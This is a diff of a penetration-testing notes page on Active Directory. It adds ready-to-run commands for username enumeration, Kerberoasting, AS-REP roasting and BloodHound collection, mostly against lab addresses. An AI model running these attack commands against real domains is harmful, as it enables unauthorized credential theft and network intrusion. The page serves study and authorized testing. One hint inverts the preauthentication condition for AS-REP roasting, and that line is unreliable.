@@ -99,7 +99,7 @@ Active directory is commonly used in banks and 95% of fortune 1000 companies and
 
 #### NTLM => NT LAN Manager Authentication
 
-<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption><p>NTLM Auth Work</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption><p>NTLM Auth Work</p></figcaption></figure>
 
 ### Kerberos Authentication
 
@@ -196,7 +196,7 @@ The direction of the one-way trust relationship is contrary to that of the acces
 
 
 
-### Recon Active Directory (No creds/sessions) <a href="#recon-active-directory-no-creds-sessions" id="recon-active-directory-no-creds-sessions"></a>
+## Recon Active Directory (No creds/sessions) <a href="#recon-active-directory-no-creds-sessions" id="recon-active-directory-no-creds-sessions"></a>
 
 If you just have access to an AD environment but you don't have any credentials/sessions you could:
 
@@ -237,8 +237,62 @@ nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>
 * A more detailed guide on how to enumerate LDAP can be found here (pay **special attention to the anonymous access**):
 
 {% embed url="https://h3ckt0r.gitbook.io/0xsec/cheat-sheet/oscp_notes#ldap-389-636" %}
-LDAP - 389/636
+LDAP - 389/636,3268, 3269
 {% endembed %}
 
-[\
-](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap)
+### User enumeration <a href="#user-enumeration" id="user-enumeration"></a>
+
+* **Anonymous SMB/LDAP enum:** Check the [**pentesting SMB**](https://h3ckt0r.gitbook.io/0xsec/cheat-sheet/oscp\_notes#port-139-445-smb) and [**pentesting LDAP**](https://h3ckt0r.gitbook.io/0xsec/cheat-sheet/oscp\_notes#ldap-389-636) pages.
+* **Kerbrute enum**: When an **invalid username is requested** the server will respond using the **Kerberos error** code _KRB5KDC\_ERR\_C\_PRINCIPAL\_UNKNOWN_, allowing us to determine that the username was invalid. **Valid usernames** will illicit either the **TGT in a AS-REP** response or the error _KRB5KDC\_ERR\_PREAUTH\_REQUIRED_, indicating that the user is required to perform pre-authentication.
+
+```bash
+./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases
+
+nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
+Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>
+
+msf> use auxiliary/gather/kerberos_enumusers
+
+crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
+```
+
+## Enumerating Active Directory WITH credentials/session
+
+{% code overflow="wrap" %}
+```bash
+GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username
+enum4linux -a -u "user" -p "password" <DC IP>
+```
+{% endcode %}
+
+## Attacks
+
+### GetUserSPNs & Kerberoasting
+
+```bash
+impacket-GetUserSPNs hacktor.local/abdo:Sql@server -dc-ip 192.168.1.5 -request
+```
+
+<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption><p>if ServicePricipalname add</p></figcaption></figure>
+
+### GetNPUsers & Kerberos Pre-Auth - AS-REP Roasting
+
+```bash
+impacket-GetNPUsers hacktor.local/abdo -dc-ip 192.168.1.5
+```
+
+<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+{% hint style="danger" %}
+the attack don't work if  **"Don't Require Kerberos preauthentication**"
+{% endhint %}
+
+<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+### bloodhound
+
+```bash
+bloodhound-python -u user -p password -ns 192.168.1.5 -d hacktor.local -c All
+```
+
+<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
